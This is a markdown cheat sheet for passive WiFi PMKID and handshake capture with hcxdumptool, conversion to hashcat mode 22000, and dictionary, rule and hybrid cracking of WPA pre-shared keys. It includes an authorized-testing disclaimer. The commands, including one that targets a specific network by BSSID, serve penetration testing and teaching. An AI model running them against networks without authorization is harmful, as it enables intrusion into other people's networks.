# HCXTools & Hashcat Cheat Sheet ⚡

## 🎯 Purpose
Practical command reference for the modern passive WiFi capture workflow using hcxtools, and for cracking the resulting hashes with Hashcat. This covers PMKID capture (clientless - no deauth needed) and EAPOL handshake capture, then unified cracking with mode 22000.

## ⚙️ Function
Organized by workflow phase: interface prep → passive capture → file conversion → hashcat cracking → advanced options. Focuses on the **hcxtools** suite (`hcxdumptool`, `hcxpcapngtool`), which differs from the classic aircrack-ng workflow in that it captures passively without sending deauth frames and outputs directly to Hashcat's modern unified format.

See [Aircrack-ng_Commands.md](Aircrack-ng_Commands.md) for the traditional active-deauth workflow, WEP attacks, and WPS attacks.

## 🏆 Goal
Successfully capture PMKID or EAPOL frames from a target network, convert them to Hashcat's unified format, and recover the pre-shared key via dictionary or rule-based attack.

## 📋 When to Use
- When you need a **clientless** attack (PMKID doesn't require waiting for a client to authenticate)
- When you want **passive capture** without sending disruptive deauth frames
- When integrating with a Pwnagotchi or similar automated passive capture rig (see [pwnagotchi_cheatsheet.md](pwnagotchi_cheatsheet.md))
- When you have a `.pcapng` from any source and need to convert it to Hashcat format

---

## Basic Workflow: PMKID & Handshake Capture

**1. Prepare the Interface (Required for HCX Tools)**
```bash
sudo ip link set wlan1 down          # Bring interface down before hcxdumptool takes it
sudo hcxdumptool -i wlan1 -o dump.pcapng --disable_deauthentication
# hcxdumptool manages monitor mode internally - no airmon-ng needed
```

**2. Capture Management Frames (PMKID & EAPOL)**
```bash
# Capture for 60 seconds; --enable_status=1 prints live status
sudo hcxdumptool -i wlan1 -o capture.pcapng --max_time=60 --check_client_list --enable_status=1
```

**3. Convert to Hashcat Format (Mode 22000)**
```bash
# hcxpcapngtool replaced hcxpcaptool in hcxtools ≥5.3.0
# Mode 22000 is the unified WPA/WPA2/WPA3 format (replaces deprecated 16800 and 2500)
hcxpcapngtool -o hash.hc22000 -E essid_list.txt capture.pcapng
# -E: writes an ESSID list alongside the hash file (useful for targeted cracking)
```

---

## Advanced Capture Options

**Targeting Specific Networks**
```bash
# Target only a specific BSSID on a single channel
sudo hcxdumptool -i wlan1 -o target.pcapng --bssid AA:BB:CC:DD:EE:FF --channel 6 --enable_status=1
```

**Filtering the Output**
```bash
# Capture only PMKID (mode 4) and EAPOL (mode 1/3) packets - this is the default
sudo hcxdumptool -i wlan1 -o filtered.pcapng --filtermode 4 --enable_status=1
```

**Capturing Only Beacons & Probe Requests**
```bash
# Non-EAPOL/PMKID frames for general reconnaissance
sudo hcxdumptool -i wlan1 -o probes.pcapng --filtermode 3 --enable_status=1
```

---

# Hashcat Cracking (Mode 22000)

Mode 22000 is the unified WPA/WPA2/WPA3 mode introduced in Hashcat 6.0. It supersedes both mode 2500 (WPA-EAPOL) and mode 16800 (WPA-PMKID-PBKDF2), which are no longer accepted in current Hashcat releases.

**WPA/WPA2/WPA3 - Dictionary Attack**
```bash
hashcat -m 22000 hash.hc22000 /path/to/wordlist.txt
```

**Using Rules for Advanced Cracking**
```bash
# Apply a rule file to transform the wordlist (e.g., append numbers, capitalization)
hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule
```

**Hybrid Attack: Wordlist + Brute-Force Mask**
```bash
# Append 4 digits to each wordlist entry
hashcat -m 22000 hash.hc22000 wordlist.txt -a 6 ?d?d?d?d
```

**Session Management**
```bash
# Resume a previous cracking session
hashcat -m 22000 hash.hc22000 /path/to/wordlist.txt --session=mysession --restore

# Show cracked passwords
hashcat -m 22000 hash.hc22000 --show
```

---

# HCXTools for File Analysis

**File Conversion & Cleaning**
```bash
# Convert a legacy .cap file to pcapng for hcxpcapngtool input
editcap -F pcapng capture.cap output.pcapng

# Merge multiple pcapng files before conversion
mergecap -w merged.pcapng file1.pcapng file2.pcapng

# Clean up handshake files (remove unneeded data)
wpaclean cleaned.cap capture-01.cap
```

**Inspecting and Filtering Captured Data**
```bash
# View unique BSSIDs/ESSIDs found in a capture file (use hcxpcapngtool for .pcapng)
hcxpcapngtool --info=stdout capture.pcapng

# Deduplicate and filter hashes before cracking
hcxhashtool -i hash.hc22000 -o unique.hc22000
```

---

## Security and Ethical Considerations ⚠️

**IMPORTANT**: These tools are for **authorized security testing only**. Unauthorized use is illegal.

- Get **written permission** before testing any network. Only test networks you own or have explicit authorization to test.
- All cracking attempts must be done in an **isolated lab environment** against hashes you are authorized to possess.
- Strictly comply with all local laws and regulations.

**Legal Use Cases:**
- Penetration testing with client authorization
- Testing your own home or lab network security
- Security research in isolated lab environments

---

## Related Files
- [README.md](README.md) - Documentation section index: all guides and cheat sheets in this directory
- [Aircrack-ng_Commands.md](Aircrack-ng_Commands.md) - Traditional active-deauth workflow, WEP, WPS attacks
- [pwnagotchi_cheatsheet.md](pwnagotchi_cheatsheet.md) - Automated passive PMKID/handshake capture using hcxtools output
- [WifiMarauder_CheatSheet.md](WifiMarauder_CheatSheet.md) - ESP32-based WiFi attacks (different hardware path)
